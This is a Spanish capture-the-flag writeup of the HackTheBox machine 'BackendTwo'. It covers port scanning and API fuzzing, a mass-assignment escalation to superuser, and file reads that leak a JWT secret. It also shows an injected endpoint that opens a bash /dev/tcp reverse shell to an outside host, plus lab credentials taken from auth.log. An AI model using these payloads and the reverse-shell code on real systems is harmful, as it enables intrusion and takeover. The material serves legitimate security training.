# Writeup: Máquina "BackendTwo" de HackTheBox

## Características principales

- Sistema operativo: Linux  
- Dificultad: Media
- Técnicas utilizadas:
  - Enumeración de API
  - Abuso de funcionalidades de API
  - Registro de usuario
  - Acceso a documentación FastAPI
  - Ataque de asignación masiva (convirtiéndonos en superusuarios)
  - Lectura de archivos del sistema
  - Fuga de información
  - Falsificación de JWT (asignación de privilegios extra)
  - Creación de archivos para ejecución remota de comandos (RCE)
  - Abuso de pam_wordle (escalada de privilegios)

## Aplicación en certificaciones

Esta máquina es particularmente útil para preparar:
- eWPT
- eWPTXv2
- OSWE

## Reconocimiento inicial

**IP objetivo**: 10.10.11.162

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.162 -oG allPorts
```

**Resultados**:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo detallado

```bash
sudo nmap -sCV -p22,80 10.10.11.162 -oN targeted
```

**Resultados**:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    uvicorn
|   GetRequest: 
|     HTTP/1.1 200 OK
|     date: Tue, 26 Apr 2022 19:43:42 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|_http-server-header: uvicorn
```

## Enumeración web

Al acceder al servicio web en el puerto 80, encontramos una API similar a la de la máquina Backend pero con versión 2.0.

![Página principal de la API](/secciones/posts/imagenes/backendtwo/web1.png)

### Fuzzing de directorios

```bash
gobuster dir -u http://10.10.11.162/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt
```

**Endpoints descubiertos**:
- `/api` (Status: 200)
- `/docs` (Status: 401)

![Endpoint /docs](/secciones/posts/imagenes/backendtwo/v1.png)

## Explotación

### Enumeración de usuarios

Los siguientes endpoints requieren autenticación:
- http://10.10.11.162/api/v1/admin/
- http://10.10.11.162/docs

### Descubrimiento de endpoints

```bash
wfuzz -X POST -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.162/api/v1/user/FUZZ --hc 404,405
```

**Endpoints relevantes**:
- `login` (422)
- `signup` (422)

### Registro de usuario

Siguiendo el mismo patrón que en la primera máquina Backend, podemos crear un usuario:

![Registro de usuario](/secciones/posts/imagenes/backendtwo/user1.avif)

### Obtención de token JWT

Tras iniciar sesión, obtenemos nuestro token de autenticación:

![Token de usuario](/secciones/posts/imagenes/backendtwo/usertoken.avif)

### Acceso a Swagger UI

Mediante intercepción de tráfico, agregamos nuestro token y configuramos el Content-Type a JSON:

![Configuración de Swagger](/secciones/posts/imagenes/backendtwo/swagjson.avif)

### Enumeración de usuarios con Burp Suite

![Enumeración de usuarios con Burp](/secciones/posts/imagenes/backendtwo/burpusers.avif)

Identificamos diferentes perfiles:
- "UHC Player" (nuestro perfil)
- "UHC Guest"
- "UHC Admin"

### Edición de perfil

![Edición de perfil](/secciones/posts/imagenes/backendtwo/edip1.avif)

### Información de usuario

Como nuestro JWT indicaba que éramos el usuario 12, consultamos `/user/12`:

### Datos del administrador

El usuario con ID 1 es el administrador:
```json
{
  "guid": "25d386cd-b808-4107-8d3a-4277a0443a6e",
  "email": "admin@backendtwo.htb",
  "profile": "UHC Admin",
  "last_update": null,
  "time_created": 1650987800991,
  "is_superuser": true,
  "id": 1
}
```

## Ataque de asignación masiva

El endpoint de edición de perfil es vulnerable a asignación masiva. Aunque la documentación solo muestra el campo "profile", podemos agregar campos adicionales:

```json
{
  "profile": "massasignament",
  "email": "test@htb.htb",
  "is_superuser": true
}
```

Esto nos permite elevarnos a superusuario:

```json
{
  "guid": "f4350520-f6dd-4c66-b9c9-04aa687f0bb6",
  "email": "new@test.htb",
  "profile": "massasignament",
  "last_update": null,
  "time_created": 1651007826026,
  "is_superuser": true,
  "id": 12
}
```

## Lectura de archivos del sistema

Podemos leer archivos del sistema como `/etc/passwd`:

![Lectura de /etc/passwd](/secciones/posts/imagenes/backendtwo/ecpass1.avif)

### Obtención de código fuente

Accedemos al código de la aplicación:
- `/home/htb/app/main.py`
- `/home/htb/app/core/config.py`

![Código de config.py](/secciones/posts/imagenes/backendtwo/py1.avif)
![Contenido de config.py](/secciones/posts/imagenes/backendtwo/py2.avif)

### Fuga de API_KEY

El archivo de configuración obtiene su secreto de una variable de entorno:
```python
JWT_SECRET: str = os.environ['API_KEY']
```

Leemos `/proc/self/environ` para obtenerla:

![Variable de entorno API_KEY](/secciones/posts/imagenes/backendtwo/py3.avif)

**API_KEY**: `68b329da9893e34099c7d8ad5cb9c940`

## Ejecución remota de comandos

### Modificación de user.py

Agregamos un endpoint para RCE:
```python
@router.delete("/ShellMe", status_code=200)
def fetch_shell() -> Any:
    """
    Sends a reverse shell
    """
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.11/9001 0>&1'")
    return
```

### Script de explotación

```bash
#!/bin/bash
TOKEN=<Your-token-here>
b64url=$(echo -n "app/api/v1/endpoints/user.py" | base64 | tr '/+' '_-' | tr -d '=')
curl -s -X POST http://10.10.11.162/api/v1/admin/file/${b64url} -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"file\":\"$(cat escaped)\"}" | jq .result -r
```

## Escalada de privilegios

### Credenciales en auth.log

Encontramos credenciales para el usuario `htb`:
```
Usuario: htb
Contraseña: 1qaz2wsx_htb!
```

### Explotación de pam_wordle

Al ejecutar `sudo -l` nos enfrentamos a un juego de palabras:

![Juego pam_wordle](/secciones/posts/imagenes/backendtwo/wordle1.avif)

Resolviendo el juego (la palabra era `chmod`), obtenemos acceso root:

```bash
sudo cat /root/root.txt
```

## Nota 

Algunos writeups pueden tener contenido de otras páginas o pocas imágenes debido a que en algunas máquinas no tomé apuntes completos. He recopilado información de varios writeups para crear esta guía.

